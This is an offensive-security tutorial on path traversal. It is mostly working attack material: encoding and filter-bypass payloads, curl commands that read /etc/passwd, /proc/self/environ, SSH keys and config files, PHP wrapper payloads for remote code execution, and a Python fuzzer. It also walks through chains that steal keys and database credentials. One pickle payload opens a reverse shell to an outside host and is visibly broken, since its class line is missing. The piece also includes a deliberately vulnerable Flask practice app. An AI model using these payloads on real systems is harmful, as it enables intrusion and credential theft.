Path Traversal

Exploiting applications that use user-supplied file paths without proper sanitization to read arbitrary files, access secrets, and escalate to remote code execution.

Overview

Path traversal is a file-access flaw: the application builds a filesystem path from user input and the kernel resolves ../ components outside the intended directory. This article explains how path resolution works, how encoding and filters interact, and how a single file read can chain into credential theft or remote code execution. After reading you can spot the vulnerable parameter, pick the right encoding, and bypass the common filters.

Required Reading

  • HTTP - URL structure, percent-encoding, path normalization
  • Unix Permissions - file permissions, directory traversal concepts, setuid
  • Filesystems - filesystem hierarchy, /proc, /etc, inodes, symlinks

The Problem

When an application opens a file based on user input, and that input is not properly constrained to an intended directory, the attacker escapes the directory using ../ sequences. The canonical example: 

# Application serves files from /var/www/files/
# URL: https://example.com/download?file=report.pdf
# Code:  open("/var/www/files/" + request.get("file"))

# Attacker request:
# GET /download?file=../../../etc/passwd
# Opens: /var/www/files/../../../etc/passwd → /etc/passwd

The path ../../../etc/passwd is resolved by the kernel. The .. components move up one directory each. Three ../ sequences from /var/www/files/ reach the filesystem root, where /etc/passwd is then appended. This is not a bug in the filesystem - it is correct behavior. The bug is in the application trusting user input as a safe path component.

Fundamental Traversal Sequences

# Basic traversal
../              # Up one directory
../../           # Up two
../../../../     # Up to root (from most application directories)

# Absolute paths — bypass prefix entirely
/etc/passwd
/var/www/.env
/home/user/.ssh/id_rsa

# Path obfuscation — same result as basic ../
....//           # If app strips "../" once, this becomes "../"
....\/           # Same with different slash
..;/             # Some parsers treat ; as path separator
..%2f            # URL-encoded /
..%252f          # Double URL-encoded / (%25 = %)

URL Encoding and Double Encoding

The critical distinction: path encoding versus URL encoding . The HTTP protocol uses URL encoding for the request line. The web server decodes this before passing to the application. Some application frameworks decode again. 

Sequence:   Browser → Web Server (decode once) → Application (may decode again) → Filesystem

If application decodes twice:
  %252e%252e%252f → Decode 1: %2e%2e%2f → Decode 2: ../  → Traversal succeeds
						
# URL-encoded traversal sequences
%2e%2e%2f        → ../
%2e%2e/           → ../ (partial — dot encoded, slash raw)
..%2f             → ../ (partial — slash encoded)
%2e%2e%5c         → ..\  (Windows path separator)

# Double-encoded traversal
%252e%252e%252f   → %2e%2e%2f → ../

# Triple-encoded (rare — some apps decode recursively)
%25252e%25252e%25252f

# Unicode representations
..%c0%af           → Unicode overlong encoding for /
..%c0%ae%c0%ae%c0%af  → Unicode overlong for ../
..%ef%bc%8f        → Full-width solidus (／, U+FF0F)

# Alternative encoding
..%u2215            → Division slash (∕)
..%u2044            → Fraction slash (⁄)
						
# Testing encoding effectiveness
curl -s 'https://example.com/download?file=../../../etc/passwd'
curl -s 'https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
curl -s --path-as-is 'https://example.com/download?file=%252e%252e%252fetc%252fpasswd'
curl -s 'https://example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'

Reading /proc on Linux

# /proc/self/ points to the current process (the web server worker)
# Each numeric /proc/PID/ directory represents a running process

curl -s 'https://example.com/download?file=/proc/self/environ'
# Contains NULL-separated environment variables. Convert to readable:
curl -s 'https://example.com/download?file=/proc/self/environ' | tr '\0' '\n'

curl -s 'https://example.com/download?file=/proc/self/cmdline' | tr '\0' ' '

# /proc/self/fd/0 = stdin, fd/1 = stdout, fd/2 = stderr
# fd/3+ = open files, sockets, pipes
# If the application keeps a log file open on fd/5, you can read it via fd/5
for fd in $(seq 0 50); do
  echo "=== fd/$fd ==="
  curl -s "https://example.com/download?file=/proc/self/fd/$fd" 2>/dev/null | head -3
done

# Process listing via /proc/ — find interesting PIDs
curl -s 'https://example.com/download?file=/proc/self/status'  # Current process info
curl -s 'https://example.com/download?file=/proc/1/cmdline' | tr '\0' ' '  # PID 1

Path Traversal in Different Contexts

The same principle applies wherever an application opens a file based on user input - not just URL download parameters. 

# File download endpoint
GET /download?file=../../../etc/passwd

# File include (PHP include/require)
GET /index.php?page=../../../etc/passwd
# PHP: include($_GET['page'] . '.php');  — appends extension
# Bypass with null byte: page=../../../etc/passwd%00

# Template resolution
GET /?template=../../../etc/passwd
# Jinja2: render_template(request.args.get('template'))

# Static file serving (misconfigured alias)
GET /static/../../../etc/passwd
# nginx alias traversal — if alias is misconfigured

# CSS/JS import
GET /style?src=../../../etc/passwd

# Image loading (avatars, thumbnails)
GET /avatar?img=../../../etc/passwd

# Log viewer (admin panels, monitoring)
GET /logs?file=../../../etc/passwd

# Configuration import
GET /import?config=../../../etc/passwd

PHP File Include (LFI) Specifics

PHP has two directives relevant to file inclusion. Understanding them is necessary for bypassing protections. 

allow_url_include = On    # Allows include('http://attacker.com/shell.txt')
allow_url_fopen = On       # Allows fopen('http://...'), include via URL wrappers
open_basedir = /var/www/   # Restricts file access to this directory tree
						
# Standard LFI
curl -s 'https://example.com/?page=../../../etc/passwd'
# If the app appends .php: page=../../../etc/passwd — becomes:
# include("../../../etc/passwd.php"); — fails because file doesn't end in .php

# Null byte termination (PHP < 5.3.4)
curl -s 'https://example.com/?page=../../../etc/passwd%00'
# Null byte terminates the C string — .php suffix is not included
# Workaround for PHP > 5.3.4: path length truncation
curl -s 'https://example.com/?page=../../../etc/passwd/./././././././././.'
# PHP path length limit can truncate trailing .php

# PHP wrappers for code execution when LFI is confirmed
# php://filter — read source code of PHP files (otherwise executed, not displayed)
curl -s 'https://example.com/?page=php://filter/convert.base64-encode/resource=index'
# Decode the base64 output to read index.php source

curl -s 'https://example.com/?page=php://filter/convert.base64-encode/resource=config'
# Read config.php, database.php, admin.php

# php://input — execute code from POST body (requires allow_url_include=On)
curl -s -X POST 'https://example.com/?page=php://input' \
  --data '<?php system("id"); ?>'

# data:// wrapper — inline code (requires allow_url_include=On)
curl -s 'https://example.com/?page=data://text/plain,<?php system("id"); ?>'
curl -s 'https://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg=='

# expect:// wrapper — execute commands directly (if expect module loaded)
curl -s 'https://example.com/?page=expect://id'

# /proc/self/environ — if User-Agent or other header is reflected in the environ file
curl -s -H 'User-Agent: <?php system("id"); ?>' \
  'https://example.com/?page=/proc/self/environ'

Filter Bypass Techniques

Applications implement filters to block ../ . Each filter has a bypass.

Filter: Strip ../ Once

# Input: ....//etc/passwd
# Strip ../ once: ../etc/passwd  → traversal achieved
curl -s 'https://example.com/download?file=....//....//....//etc/passwd'

# Input: ..././etc/passwd
# Strip ../ once: ../etc/passwd
curl -s 'https://example.com/download?file=..././..././..././etc/passwd'

# Input: ..\/
# If app only strips / variants but not \: ..\/ → ../
curl -s 'https://example.com/download?file=..\..\..\/etc/passwd'

Filter: Strip ../ Recursively

# After recursive strip:
# ....// → strip(../) → ../ — but wait, strip was recursive?
# If strip is truly recursive, it handles ....// correctly (strips both)
# Bypass: use encoding that strip doesn't recognize
curl -s 'https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

# Bypass with ....\/ — if filter only handles forward slashes
curl -s 'https://example.com/download?file=....\/....\/....\/etc/passwd'

Filter: Prefix Must Match

# The check is: path.startswith("/var/www/files/")
# Payload: /var/www/files/../../../etc/passwd
curl -s 'https://example.com/download?file=/var/www/files/../../../etc/passwd'
# Resolves to: /var/www/files/../../../etc/passwd → /etc/passwd

Filter: Substring Must Match

# The check is: "/var/www/files/" in path
# Payload: /var/www/files/../../../etc/passwd — contains the string, traversal still works
curl -s 'https://example.com/download?file=/var/www/files/../../../etc/passwd'

Filter: Extension Whitelist

# The check is: path.endswith((".pdf", ".jpg", ".png"))
# Null byte (if the underlying language is C/PHP < 5.3.4):
curl -s 'https://example.com/download?file=../../../etc/passwd%00.pdf'
# At the C level, the string ends at %00. The application sees: ../../../etc/passwd\0.pdf
# But fopen("../../../etc/passwd\0.pdf") opens /etc/passwd because C strings null-terminate

Filter: realpath Check

# realpath() resolves symlinks and ../ before checking
# If the filter is: strpos(realpath($file), '/var/www/files/') === 0
# Symlink bypass: if /var/www/files/ contains a symlink to /etc/
# ln -s /etc /var/www/files/etc_link
# Then access: /download?file=etc_link/passwd — realpath = /etc/passwd — blocked?
# Actually, realpath fully resolves → /etc/passwd → fails the check

# But: race condition if symlink changes between check and open
# Or: /proc/self/fd/ symlinks — might bypass realpath() depending on PHP version
curl -s 'https://example.com/download?file=/proc/self/cwd/../../../etc/passwd'

Path Traversal Fuzzer in Python

A custom fuzzer that generates traversal payloads with various encoding and filtering scenarios.

#!/usr/bin/env python3
"""
dotdotfuzz — path traversal payload generator and testing tool.
Generates traversal sequences with multiple bypass techniques.
"""
import urllib.parse
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/download?file="
FILE_TO_READ = "/etc/passwd"
PASSWD_SIGNATURE = "root:x:"  # Expected content in /etc/passwd

SEQUENCES = {
    "basic": ["../" * i + FILE_TO_READ.lstrip("/") for i in range(1, 12)],
    "absolute": [FILE_TO_READ],
    "nested": ["....//" * i + FILE_TO_READ.lstrip("/") for i in range(1, 12)],
    "nested2": ["..././" * i + FILE_TO_READ.lstrip("/") for i in range(1, 12)],
    "urlencoded": [],
    "double_encoded": [],
}

# Generate URL-encoded variants
for depth in range(1, 10):
    traversal = ("../" * depth) + FILE_TO_READ.lstrip("/")
    SEQUENCES["urlencoded"].append(urllib.parse.quote(traversal))
    SEQUENCES["double_encoded"].append(urllib.parse.quote(urllib.parse.quote(traversal)))

def generate_encoding_variants():
    """Generate encoding variations for a single ../ sequence."""
    variants = []
    # Different encoding schemes
    encodings = [
        ("%2e%2e%2f", "Single URL-encode"),
        ("%252e%252e%252f", "Double URL-encode"),
        ("..%2f", "Partial URL-encode (slash)"),
        ("%2e%2e/", "Partial URL-encode (dots)"),
        ("..%252f", "Double-encode slash only"),
        ("%252e%252e/", "Double-encode dots only"),
        ("..%c0%af", "Overlong UTF-8 slash"),
        ("..%ef%bc%8f", "Full-width solidus"),
        ("..%255c", "Double-encode backslash"),
        ("%c0%ae%c0%ae%c0%af", "Overlong UTF-8 ../"),
        ("..\;", "Semicolon separator"),
    ]
    for encoded, label in encodings:
        payload = (encoded * 8) + urllib.parse.quote(FILE_TO_READ.lstrip("/"))
        variants.append((payload, label))
    return variants

def test_payloads(url_template):
    """Send payloads and check response for passwd content."""
    results = []
    for category, payloads in SEQUENCES.items():
        for payload in payloads:
            url = url_template + payload
            try:
                resp = requests.get(url, timeout=5, allow_redirects=False)
                hit = PASSWD_SIGNATURE in resp.text
                results.append({
                    "category": category,
                    "payload": payload[:80],
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "hit": hit
                })
                if hit:
                    print(f"[+] HIT: [{category}] {payload[:60]}")
            except Exception as e:
                print(f"[-] Error: {e}")

    # Test encoding variants
    for payload, label in generate_encoding_variants():
        url = url_template + payload
        try:
            resp = requests.get(url, timeout=5, allow_redirects=False)
            hit = PASSWD_SIGNATURE in resp.text
            if hit:
                print(f"[+] HIT: [{label}] {payload[:60]}")
        except Exception:
            pass

    return results

if __name__ == "__main__":
    test_payloads(TARGET)

Reading files is rarely the end goal. Each file provides information that chains to code execution.

Chain 1: Source to RCE

# Step 1: Read application source

# Find: pickle.loads(request.get_data()) or yaml.load(user_input)

# Step 2: Craft deserialization payload

import pickle, os, base64

    def __reduce__(self):
        return (os.system, ('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"',))
print(base64.b64encode(pickle.dumps(Exploit())))
" > pickle-payload.txt

# Step 3: Send deserialization payload to the discovered endpoint

Chain 2: SSH Keys to Lateral

# Step 1: Read /etc/passwd to find users with home directories
curl -s 'https://example.com/download?file=/etc/passwd' | \
  grep -E '/home/|/bin/bash' | cut -d: -f1,6
# Output: root:/root, www-data:/var/www, admin:/home/admin

# Step 2: Attempt to read SSH keys
for user_path in /root /.ssh/id_rsa /home/admin/.ssh/id_rsa; do
  key=$(curl -s "https://example.com/download?file=${user_path}" 2>/dev/null)
  if echo "$key" | grep -q "PRIVATE KEY"; then
    echo "$key" > found_key
    chmod 600 found_key
    ssh -i found_key admin@target-host  # Use the key
    break
  fi
done

Chain 3: DB Config to Creds

# Step 1: Read common config locations
for config in wp-config.php .env config.php settings.py database.yml; do
  curl -s "https://example.com/download?file=/var/www/html/$config"
done

# Step 2: Extract credentials
# From wp-config.php:
# define('DB_NAME', 'wordpress');

mysql -u wp_user -p'SuperSecret123' -h target-host wordpress

/proc Filesystem Exploitation (Linux)

The /proc filesystem is a goldmine for path traversal. It exposes the kernel's view of every process, including the process handling your request. 

# /proc/self/environ — environment variables of the current worker process
# Often contains: DB_HOST, DB_USER, DB_PASS, API_KEY, SECRET_KEY, APP_SECRET
curl -s 'https://example.com/download?file=/proc/self/environ' | tr '\0' '\n'

# /proc/self/cmdline — command line used to start the process
curl -s 'https://example.com/download?file=/proc/self/cmdline' | tr '\0' ' '

# /proc/self/cwd/ — symlink to the current working directory
# Allows traversal relative to the application root, bypassing prefix requirements
curl -s 'https://example.com/download?file=/proc/self/cwd/../.env'
# If cwd = /var/www/app/, resolves to /var/www/app/../.env → /var/www/.env

# /proc/self/fd/N — open file descriptors
# If the server keeps /var/log/apache2/access.log open on fd 7:
curl -s 'https://example.com/download?file=/proc/self/fd/7'
# Read the live access log — may contain session cookies, tokens, request bodies

# /proc/self/maps — memory layout of the process
curl -s 'https://example.com/download?file=/proc/self/maps'
# Useful for exploit development (ASLR bypass, finding libraries)

# /proc/self/status — process status and capabilities
curl -s 'https://example.com/download?file=/proc/self/status'
# Check: CapEff (effective capabilities), Uid/Gid

# /proc/self/mounts — mounted filesystems
curl -s 'https://example.com/download?file=/proc/self/mounts'
# Find: Docker volumes, NFS mounts, tmpfs locations

# /proc/net/tcp — active TCP connections
curl -s 'https://example.com/download?file=/proc/net/tcp'
# Decode with:
# echo "0100007F:1F90" | python3 -c "import sys; hex=sys.stdin.read().strip().split(':'); ip='.'.join([str(int(hex[0][i:i+2],16)) for i in range(6,-1,-2)]); port=int(hex[1],16); print(f'{ip}:{port}')"
# Lists all TCP connections including internal services

Windows-Specific Path Traversal

Windows filesystem semantics differ from Unix in ways that create additional traversal possibilities.

# Windows paths use backslash, but most web apps accept both
..\..\..\windows\win.ini
../../../../windows/win.ini

# ADS (Alternate Data Streams) — hidden file content
file.txt::$DATA          # Access default stream
file.txt:secret.txt::$DATA  # Access named stream

# \\?\ prefix — bypass MAX_PATH limitation (260 chars)
\\?\C:\windows\win.ini

# Absolute UNC paths — some apps resolve these
\\localhost\C$\windows\win.ini
\\127.0.0.1\C$\windows\win.ini

# Common Windows targets
C:\windows\win.ini                    # Basic confirmation file
C:\windows\system32\drivers\etc\hosts # Internal hostnames
C:\inetpub\wwwroot\web.config         # IIS config (connection strings!)
C:\xampp\htdocs\wp-config.php        # XAMPP WordPress
C:\wamp64\www\wp-config.php          # WAMP WordPress
C:\Program Files\MySQL\my.ini        # MySQL config
C:\Users\All Users\                  # Shared user data

Manual Exploitation Walkthrough

A vulnerable Flask file viewer application for practice.

#!/usr/bin/env python3
"""
Vulnerable Flask file viewer with multiple traversal vulnerability levels.
"""
from flask import Flask, request, render_template_string, send_file
import os

app = Flask(__name__)
BASE_DIR = "/var/www/files"

HTML = """
<html><body>
<h2>File Viewer</h2>
<hr>
<h3>Level 1: No filter</h3>
<form action="/view" method="GET">
  <input name="file" placeholder="File path" value="report.pdf">
  <input type="submit" value="View">
</form>
<hr>
<h3>Level 2: Strips ../</h3>
<form action="/view-stripped" method="GET">
  <input name="file" placeholder="File path" value="report.pdf">
  <input type="submit" value="View (Stripped)">
</form>
<hr>
<h3>Level 3: Extension whitelist</h3>
<form action="/view-whitelist" method="GET">
  <input name="file" placeholder="File path" value="report.pdf">
  <input type="submit" value="View (Whitelist)">
</form>
<hr>
<h3>Level 4: Requires prefix</h3>
<form action="/view-prefix" method="GET">
  <input name="file" placeholder="File path" value="report.pdf">
  <input type="submit" value="View (Prefix)">
</form>
<hr>
{% if content %}<pre>{{ content }}</pre>{% endif %}
{% if error %}<p style="color:red">{{ error }}</p>{% endif %}
</body></html>
"""

@app.route('/view')
def view():
    filename = request.args.get('file', '')
    # VULNERABLE: No filter at all
    filepath = os.path.join(BASE_DIR, filename)
    try:
        with open(filepath, 'r', errors='replace') as f:
            content = f.read(2000)
        return render_template_string(HTML, content=content)
    except Exception as e:
        return render_template_string(HTML, error=str(e))

@app.route('/view-stripped')
def view_stripped():
    filename = request.args.get('file', '')
    # WEAK FILTER: Strip ../ once
    filename = filename.replace('../', '')
    filepath = os.path.join(BASE_DIR, filename)
    try:
        with open(filepath, 'r', errors='replace') as f:
            content = f.read(2000)
        return render_template_string(HTML, content=content)
    except Exception as e:
        return render_template_string(HTML, error=str(e))

@app.route('/view-whitelist')
def view_whitelist():
    filename = request.args.get('file', '')
    # WEAK FILTER: Extension whitelist only
    allowed_extensions = ('.pdf', '.txt', '.jpg', '.png', '.html')
    if not any(filename.lower().endswith(ext) for ext in allowed_extensions):
        return render_template_string(HTML, error="File type not allowed")
    filepath = os.path.join(BASE_DIR, filename)
    try:
        with open(filepath, 'r', errors='replace') as f:
            content = f.read(2000)
        return render_template_string(HTML, content=content)
    except Exception as e:
        return render_template_string(HTML, error=str(e))

Verification and Common Mistakes

# Verify traversal works by reading a known file
curl -s 'https://example.com/download?file=../../../etc/passwd' | head -1
# Should output: root:x:0:0:root:/root:/bin/bash
# If not, check: is the response truncated? Are you in a chroot?
# Try: /etc/hostname (single line, simple) or /etc/issue

# Verify you're not in a container (Docker/Podman)
curl -s 'https://example.com/download?file=/proc/1/cgroup' | grep -c 'docker\|containerd\|libpod'
# If matches found → containerized environment — limits what you can access

# Verify file permissions — are you the www-data user?
curl -s 'https://example.com/download?file=/proc/self/status' | grep -E '^Uid|^Gid'
# Shows UID/GID of the web server process

Common mistakes: 1. Not accounting for the prepended path. If the app prefixes /var/www/html/uploads/ , you need enough ../ to escape: ../../../../../../etc/passwd . 1. Using '../' when '..\' is needed. Test both on Windows targets. 1. Not recognizing chroot or container boundaries. If in a container, /etc/passwd might exist but contain only container users. 1. Giving up after one encoding fails. Try URL encoding, double encoding, Unicode, overlong UTF-8, and null bytes systematically. 1. Assuming the file read gives raw output. Some apps wrap output in HTML , JSON , or XML . View the page source.
